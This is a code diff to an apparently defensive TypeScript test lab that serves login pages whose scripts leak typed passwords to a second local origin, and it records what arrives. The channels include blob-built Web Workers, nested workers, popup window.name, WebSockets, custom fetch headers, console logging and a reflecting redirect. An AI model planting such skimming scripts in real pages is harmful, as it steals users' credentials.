@@ -4,7 +4,7 @@ import type { Duplex } from 'node:stream';
 
 type Origins = Readonly<{ primary: string; secondary: string }>;
 type Route = (origins: Origins) => string;
-type LabRequest = Readonly<{ method: string; path: string }>;
+export type LabRequest = Readonly<{ method: string; path: string; body?: string }>;
 
 export const CONTROL_LAB_ROUTES = Object.freeze({
   '/password-basic': () => loginForm(),
@@ -135,6 +135,40 @@ export const CONTROL_LAB_ROUTES = Object.freeze({
       navigator.sendBeacon('${secondary}/blob-beacon', new Blob([this.value]));
     });
   </script>`,
+  '/worker-blob': ({ secondary }) => workerLeakPage(`${secondary}/worker-blob-receive`),
+  '/worker-beacon': ({ secondary }) => workerLeakPage(`${secondary}/worker-beacon-receive`),
+  '/nested-worker-blob': ({ secondary }) => nestedWorkerLeakPage(`${secondary}/nested-worker-blob-receive`),
+  '/terminate-worker-slow': ({ secondary }) => terminatingWorkerPage(
+    `${secondary}/terminate-worker-slow-receive`, false,
+  ),
+  '/terminate-worker-fast': ({ secondary }) => terminatingWorkerPage(
+    `${secondary}/terminate-worker-fast-receive`, true,
+  ),
+  '/page-close-worker': ({ secondary }) => workerLeakPage(`${secondary}/page-close-worker-receive`),
+  '/popup-worker': () => `${loginForm()}<button id="popup" type="button">Popup</button><script>
+    document.querySelector('#popup').addEventListener('click', function () {
+      var value = document.querySelector('#password').value;
+      window.open('/popup-worker-child', value);
+    });
+  </script>`,
+  '/popup-worker-child': ({ secondary }) => `<script>
+    var value = window.name;
+    var source = ${JSON.stringify(workerSource(`${secondary}/popup-worker-receive`))};
+    var worker = new Worker(URL.createObjectURL(new Blob([source])));
+    worker.postMessage(value);
+  </script>`,
+  '/decoy-control': () => `${loginForm()}<form method="post" action="/verify">
+    <input id="decoy" type="password"><button id="verify" type="submit">Verify</button></form>`,
+  '/reflect-redirect': () => loginForm('name="password"', 'action="/reflect"'),
+  '/console-leak': () => `${loginForm()}<script>
+    document.querySelector('#password').addEventListener('input', function () {
+      var shape = new URL(location.href).searchParams.get('shape');
+      if (shape === 'object') console.log({ password: this.value });
+      else if (shape === 'array') console.log([this.value]);
+      else if (shape === 'format') console.log('%s', this.value);
+      else console.log(this.value);
+    });
+  </script>`,
   '/header-leak': ({ secondary }) => `${loginForm()}<script>
     document.querySelector('#password').addEventListener('input', function () {
       fetch('${secondary}/header-receive', { headers: { 'x-tv-leak': this.value } }).catch(() => {});
@@ -157,8 +191,9 @@ export const CONTROL_LAB_ROUTES = Object.freeze({
       fetch('/cookie-receive').catch(() => {});
     });
   </script>`,
-  '/ws-leak': ({ secondary }) => `${loginForm()}<script>
+  '/ws-leak': ({ secondary }) => `${loginForm()}<button id="ws-ready" type="button" disabled>Ready</button><script>
     var socket = new WebSocket('${secondary.replace('http:', 'ws:')}/ws-receive');
+    socket.addEventListener('open', () => { document.querySelector('#ws-ready').disabled = false });
     document.querySelector('#password').addEventListener('input', function () {
       var value = this.value;
       if (socket.readyState === WebSocket.OPEN) socket.send(value);
@@ -201,15 +236,14 @@ export async function startControlsLab(): Promise<ControlsLab> {
   let origins: Origins = { primary: '', secondary: '' };
   const secondaryRequests: LabRequest[] = [];
   const secondary = createServer((request, response) => {
-    secondaryRequests.push(Object.freeze({
-      method: request.method ?? '',
-      path: new URL(request.url ?? '/', 'http://fixture.invalid').pathname,
-    }));
-    serve(request.url, response, () => origins);
+    void serveAndCapture(request, response, () => origins, secondaryRequests)
+      .catch(() => response.destroy());
   });
   attachWebSocketServer(secondary, secondaryRequests);
   const secondaryOrigin = await listen(secondary);
-  const primary = createServer((request, response) => serve(request.url, response, () => origins));
+  const primary = createServer((request, response) => {
+    void serveAndCapture(request, response, () => origins).catch(() => response.destroy());
+  });
   attachWebSocketServer(primary, []);
   let primaryOrigin: string;
   try {
@@ -227,14 +261,24 @@ export async function startControlsLab(): Promise<ControlsLab> {
   });
 }
 
-function serve(
-  rawUrl: string | undefined,
+async function serveAndCapture(
+  request: IncomingMessage,
   response: import('node:http').ServerResponse,
   getOrigins: () => Origins,
-): void {
-  const path = new URL(rawUrl ?? '/', 'http://fixture.invalid').pathname;
+  requests?: LabRequest[],
+): Promise<void> {
+  const url = new URL(request.url ?? '/', 'http://fixture.invalid');
+  const path = url.pathname;
+  const body = await readRequestBody(request);
+  requests?.push(Object.freeze({
+    method: request.method ?? '', path, ...(body === '' ? {} : { body }),
+  }));
   if (path === '/redirect-start') return redirect(response, '/redirect-middle');
   if (path === '/redirect-middle') return redirect(response, '/redirect-final');
+  if (path === '/reflect' && request.method === 'POST') {
+    const value = new URLSearchParams(body).get('password') ?? body;
+    return redirect(response, `${getOrigins().secondary}/landed?p=${encodeURIComponent(value)}`);
+  }
   if (path === '/submit' || path === '/login') {
     response.statusCode = 200;
     response.end('ok');
@@ -255,6 +299,12 @@ function serve(
     route === undefined ? '<main>not found</main>' : route(getOrigins()),
     path === '/static-token-login' ? 'data-tv-document="static-document"' : '',
   ));
+}
+
+async function readRequestBody(request: IncomingMessage): Promise<string> {
+  const chunks: Buffer[] = [];
+  for await (const chunk of request) chunks.push(Buffer.from(chunk));
+  return Buffer.concat(chunks).toString('utf8');
 }
 
 function attachWebSocketServer(server: Server, requests: LabRequest[]): void {
@@ -318,6 +368,47 @@ function formWithField(field: string): string {
 function mutationPage(statement: string, extra = ''): string {
   return `${loginForm()}<button id="mutate" type="button">Mutate</button>${extra}
     <script>document.querySelector('#mutate').addEventListener('click',()=>{${statement}})</script>`;
+}
+
+function workerSource(endpoint: string): string {
+  return `self.onmessage=function(event){fetch(${JSON.stringify(endpoint)},`
+    + `{method:'POST',body:new Blob([event.data])}).catch(function(){})}`;
+}
+
+function workerLeakPage(endpoint: string): string {
+  return `${loginForm()}<script>
+    document.querySelector('#password').addEventListener('input', function () {
+      var worker = new Worker(URL.createObjectURL(new Blob([${JSON.stringify(workerSource(endpoint))}])));
+      worker.postMessage(this.value);
+    });
+  </script>`;
+}
+
+function nestedWorkerLeakPage(endpoint: string): string {
+  const inner = workerSource(endpoint);
+  const outer = `self.onmessage=function(event){var source=${JSON.stringify(inner)};`
+    + `var worker=new Worker(URL.createObjectURL(new Blob([source])));worker.postMessage(event.data)}`;
+  return `${loginForm()}<script>
+    document.querySelector('#password').addEventListener('input', function () {
+      var worker = new Worker(URL.createObjectURL(new Blob([${JSON.stringify(outer)}])));
+      worker.postMessage(this.value);
+    });
+  </script>`;
+}
+
+function terminatingWorkerPage(endpoint: string, afterDelivery: boolean): string {
+  const source = `self.onmessage=async function(event){self.postMessage('sending');`
+    + `await fetch(${JSON.stringify(endpoint)},{method:'POST',body:new Blob([event.data])});`
+    + `self.postMessage('delivered')}`;
+  return `${loginForm()}<script>
+    document.querySelector('#password').addEventListener('input', function () {
+      var worker = new Worker(URL.createObjectURL(new Blob([${JSON.stringify(source)}])));
+      worker.onmessage = function (event) {
+        if (event.data === ${JSON.stringify(afterDelivery ? 'delivered' : 'sending')}) worker.terminate();
+      };
+      worker.postMessage(this.value);
+    });
+  </script>`;
 }
 
 function overlayStyle(): string {
